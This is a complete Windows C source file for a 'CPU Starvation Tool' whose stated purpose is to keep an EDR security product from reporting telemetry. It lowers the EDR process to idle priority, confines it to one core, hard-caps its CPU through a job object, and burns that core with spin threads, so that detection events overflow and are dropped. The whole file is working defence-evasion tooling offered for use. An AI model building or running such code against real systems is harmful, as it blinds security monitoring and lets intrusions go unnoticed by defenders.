/*
 * 14_cpu_starve.c
 * CPU Starvation — prevent EDR from reporting telemetry
 *
 * Four mechanisms, combinable:
 *   1. SetPriorityClass(IDLE_PRIORITY_CLASS) — demotes all threads of EDR
 *      to idle scheduling; they only run when CPU is 100% free.
 *   2. SetProcessAffinityMask(0x1) — confines EDR to a single logical CPU.
 *      Combined with (3) that CPU is also fully consumed.
 *   3. Job Object CPU Rate Control — hard caps the EDR process group to
 *      a low CPU rate (e.g., 1%) using SetInformationJobObject.
 *   4. Spin-burn thread — spawns threads that consume a target CPU core.
 *
 * Practical effect: EDR's event processing queues fill up and overflow,
 * telemetry events are dropped, timeout-based connections close.
 * Not a network-level block, but degrades reporting significantly.
 *
 * Build:
 *   cl 14_cpu_starve.c /link
 *
 * Usage:
 *   14_cpu_starve.exe status   <pid>             Show scheduling info
 *   14_cpu_starve.exe priority <pid>             Set to IDLE priority
 *   14_cpu_starve.exe affinity <pid> <mask_hex>  Set CPU affinity mask
 *   14_cpu_starve.exe job      <pid> <rate_pct>  Apply job CPU rate cap (1-99%)
 *   14_cpu_starve.exe burn     <core>            Spin on a specific CPU core
 *   14_cpu_starve.exe restore  <pid>             Restore normal priority and affinity
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <wchar.h>
#include <tlhelp32.h>

/* Job CPU rate control info */
#ifndef JOB_OBJECT_CPU_RATE_CONTROL_ENABLE
#define JOB_OBJECT_CPU_RATE_CONTROL_ENABLE  0x1
#define JOB_OBJECT_CPU_RATE_CONTROL_HARD_CAP 0x4
#endif

typedef struct _JOBOBJECT_CPU_RATE_CONTROL_INFORMATION {
    DWORD ControlFlags;
    union {
        DWORD CpuRate;      /* 0..10000, where 10000 = 100% */
        DWORD Weight;
        struct {
            WORD  MinRate;
            WORD  MaxRate;
        } MinMaxRate;
    };
} JOBOBJECT_CPU_RATE_CONTROL_INFORMATION;

static volatile BOOL g_BurnRunning = TRUE;

static BOOL WINAPI ConsoleHandler(DWORD sig)
{
    if (sig == CTRL_C_EVENT) {
        g_BurnRunning = FALSE;
        return TRUE;
    }
    return FALSE;
}

static DWORD FindPidByName(const WCHAR *name)
{
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return pid;
}

static void ShowStatus(HANDLE hProc)
{
    DWORD pc = GetPriorityClass(hProc);
    DWORD_PTR procMask = 0, sysMask = 0;
    GetProcessAffinityMask(hProc, &procMask, &sysMask);

    const WCHAR *pcStr = L"NORMAL";
    switch (pc) {
        case IDLE_PRIORITY_CLASS:          pcStr = L"IDLE";          break;
        case BELOW_NORMAL_PRIORITY_CLASS:  pcStr = L"BELOW_NORMAL";  break;
        case NORMAL_PRIORITY_CLASS:        pcStr = L"NORMAL";        break;
        case ABOVE_NORMAL_PRIORITY_CLASS:  pcStr = L"ABOVE_NORMAL";  break;
        case HIGH_PRIORITY_CLASS:          pcStr = L"HIGH";          break;
        case REALTIME_PRIORITY_CLASS:      pcStr = L"REALTIME";      break;
    }

    wprintf(L"  Priority class : %s (0x%08X)\n", pcStr, pc);
    wprintf(L"  Affinity mask  : 0x%016llX\n", (unsigned long long)procMask);
    wprintf(L"  System mask    : 0x%016llX\n", (unsigned long long)sysMask);
}

/* Set process to IDLE priority */
static BOOL SetIdlePriority(DWORD pid)
{
    HANDLE hProc = OpenProcess(PROCESS_SET_INFORMATION | PROCESS_QUERY_INFORMATION,
                               FALSE, pid);
    if (!hProc) {
        wprintf(L"[-] OpenProcess(%lu): %lu\n", pid, GetLastError());
        return FALSE;
    }

    wprintf(L"[*] Before:\n");
    ShowStatus(hProc);

    BOOL ok = SetPriorityClass(hProc, IDLE_PRIORITY_CLASS);
    if (ok) {
        wprintf(L"\n[+] Priority set to IDLE_PRIORITY_CLASS\n");
    } else {
        wprintf(L"\n[-] SetPriorityClass failed: %lu\n", GetLastError());
    }

    wprintf(L"\n[*] After:\n");
    ShowStatus(hProc);

    CloseHandle(hProc);
    return ok;
}

/* Set CPU affinity mask */
static BOOL SetAffinity(DWORD pid, DWORD_PTR mask)
{
    HANDLE hProc = OpenProcess(PROCESS_SET_INFORMATION | PROCESS_QUERY_INFORMATION,
                               FALSE, pid);
    if (!hProc) {
        wprintf(L"[-] OpenProcess(%lu): %lu\n", pid, GetLastError());
        return FALSE;
    }

    BOOL ok = SetProcessAffinityMask(hProc, mask);
    if (ok) {
        wprintf(L"[+] Affinity mask set to 0x%llX\n", (unsigned long long)mask);
    } else {
        wprintf(L"[-] SetProcessAffinityMask failed: %lu\n", GetLastError());
    }

    CloseHandle(hProc);
    return ok;
}

/*
 * Apply a Job Object CPU rate cap to a process.
 * rate_pct: 1..99 (percentage of all CPUs)
 * CpuRate in JOBOBJECT_CPU_RATE_CONTROL_INFORMATION is in units of 1/100 of a percent
 * (i.e., 10000 = 100%), but documented as "cycles out of 10,000" in some sources.
 * Empirically: CpuRate = percent * 100 works correctly.
 */
static BOOL ApplyJobCpuCap(DWORD pid, DWORD ratePct)
{
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        wprintf(L"[-] OpenProcess(%lu): %lu\n", pid, GetLastError());
        return FALSE;
    }

    HANDLE hJob = CreateJobObjectW(NULL, NULL);
    if (!hJob) {
        wprintf(L"[-] CreateJobObject: %lu\n", GetLastError());
        CloseHandle(hProc);
        return FALSE;
    }

    if (!AssignProcessToJobObject(hJob, hProc)) {
        DWORD err = GetLastError();
        wprintf(L"[-] AssignProcessToJobObject: %lu\n", err);
        if (err == ERROR_ACCESS_DENIED)
            wprintf(L"    (Process may already be in another job object)\n");
        CloseHandle(hJob);
        CloseHandle(hProc);
        return FALSE;
    }

    JOBOBJECT_CPU_RATE_CONTROL_INFORMATION cpuRate = {0};
    cpuRate.ControlFlags = JOB_OBJECT_CPU_RATE_CONTROL_ENABLE |
                           JOB_OBJECT_CPU_RATE_CONTROL_HARD_CAP;
    cpuRate.CpuRate      = ratePct * 100; /* e.g., 1% → 100 */

    if (!SetInformationJobObject(hJob, JobObjectCpuRateControlInformation,
                                  &cpuRate, sizeof(cpuRate)))
    {
        wprintf(L"[-] SetInformationJobObject(CpuRateControl): %lu\n", GetLastError());
        CloseHandle(hJob);
        CloseHandle(hProc);
        return FALSE;
    }

    wprintf(L"[+] Job CPU cap applied: %lu%% of total CPU\n", ratePct);
    wprintf(L"[*] Job handle kept open — cap removed when this process exits.\n");
    wprintf(L"    (Press Ctrl+C to release the cap)\n");

    /* Keep alive so the job isn't destroyed */
    SetConsoleCtrlHandler(ConsoleHandler, TRUE);
    while (g_BurnRunning) Sleep(500);

    CloseHandle(hJob);
    CloseHandle(hProc);
    return TRUE;
}

/* Spin-burn thread procedure */
static DWORD WINAPI BurnThread(LPVOID pCore)
{
    DWORD core = (DWORD)(ULONG_PTR)pCore;
    DWORD_PTR mask = (DWORD_PTR)1 << core;

    /* Pin to target core */
    SetThreadAffinityMask(GetCurrentThread(), mask);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

    /* Consume the core */
    volatile ULONGLONG x = 0;
    while (g_BurnRunning) {
        x++;
        /* Short sleep to allow scheduler access, but consume ~95% of the core */
        if ((x & 0xFFFFF) == 0) Sleep(1);
    }
    return 0;
}

/* Restore process to normal priority and full affinity */
static BOOL RestoreProcess(DWORD pid)
{
    HANDLE hProc = OpenProcess(PROCESS_SET_INFORMATION | PROCESS_QUERY_INFORMATION,
                               FALSE, pid);
    if (!hProc) {
        wprintf(L"[-] OpenProcess(%lu): %lu\n", pid, GetLastError());
        return FALSE;
    }

    DWORD_PTR proc = 0, sys = 0;
    GetProcessAffinityMask(hProc, &proc, &sys);

    SetPriorityClass(hProc, NORMAL_PRIORITY_CLASS);
    SetProcessAffinityMask(hProc, sys); /* restore to full system mask */

    wprintf(L"[+] Priority restored to NORMAL\n");
    wprintf(L"[+] Affinity restored to full system mask: 0x%llX\n",
            (unsigned long long)sys);

    CloseHandle(hProc);
    return TRUE;
}

int wmain(int argc, wchar_t *argv[])
{
    wprintf(L"[*] CPU Starvation Tool\n\n");

    if (argc < 2) {
        wprintf(L"Usage:\n");
        wprintf(L"  %s status   <pid>              Show process scheduling info\n", argv[0]);
        wprintf(L"  %s priority <pid>              Set to IDLE priority class\n", argv[0]);
        wprintf(L"  %s affinity <pid> <mask_hex>   Set affinity (e.g., 0x1 = core 0 only)\n", argv[0]);
        wprintf(L"  %s job      <pid> <pct>        Hard-cap CPU to pct%% via Job Object\n", argv[0]);
        wprintf(L"  %s burn     <core>             Spin-burn a CPU core (0-based)\n", argv[0]);
        wprintf(L"  %s restore  <pid>              Restore normal priority + affinity\n", argv[0]);
        return 1;
    }

    if (_wcsicmp(argv[1], L"status") == 0 && argc >= 3) {
        DWORD pid = (DWORD)_wtoi(argv[2]);
        HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
        if (!hProc) { wprintf(L"[-] OpenProcess: %lu\n", GetLastError()); return 1; }
        ShowStatus(hProc);
        CloseHandle(hProc);
        return 0;
    }

    if (_wcsicmp(argv[1], L"priority") == 0 && argc >= 3) {
        DWORD pid = (DWORD)_wtoi(argv[2]);
        return SetIdlePriority(pid) ? 0 : 1;
    }

    if (_wcsicmp(argv[1], L"affinity") == 0 && argc >= 4) {
        DWORD pid = (DWORD)_wtoi(argv[2]);
        DWORD_PTR mask = (DWORD_PTR)wcstoul(argv[3], NULL, 16);
        return SetAffinity(pid, mask) ? 0 : 1;
    }

    if (_wcsicmp(argv[1], L"job") == 0 && argc >= 4) {
        DWORD pid = (DWORD)_wtoi(argv[2]);
        DWORD pct = (DWORD)_wtoi(argv[3]);
        if (pct < 1) pct = 1;
        if (pct > 99) pct = 99;
        return ApplyJobCpuCap(pid, pct) ? 0 : 1;
    }

    if (_wcsicmp(argv[1], L"burn") == 0 && argc >= 3) {
        DWORD core = (DWORD)_wtoi(argv[2]);
        wprintf(L"[*] Burning CPU core %lu (Ctrl+C to stop)...\n", core);

        SetConsoleCtrlHandler(ConsoleHandler, TRUE);

        /* Launch burn threads — one per logical CPU is max, one is a good start */
        HANDLE hThread = CreateThread(NULL, 0, BurnThread,
                                      (LPVOID)(ULONG_PTR)core, 0, NULL);
        if (!hThread) {
            wprintf(L"[-] CreateThread: %lu\n", GetLastError());
            return 1;
        }

        while (g_BurnRunning) Sleep(200);
        WaitForSingleObject(hThread, 3000);
        CloseHandle(hThread);
        wprintf(L"\n[+] Burn thread stopped.\n");
        return 0;
    }

    if (_wcsicmp(argv[1], L"restore") == 0 && argc >= 3) {
        DWORD pid = (DWORD)_wtoi(argv[2]);
        return RestoreProcess(pid) ? 0 : 1;
    }

    wprintf(L"[-] Unknown command or missing arguments: %s\n", argv[1]);
    return 1;
}
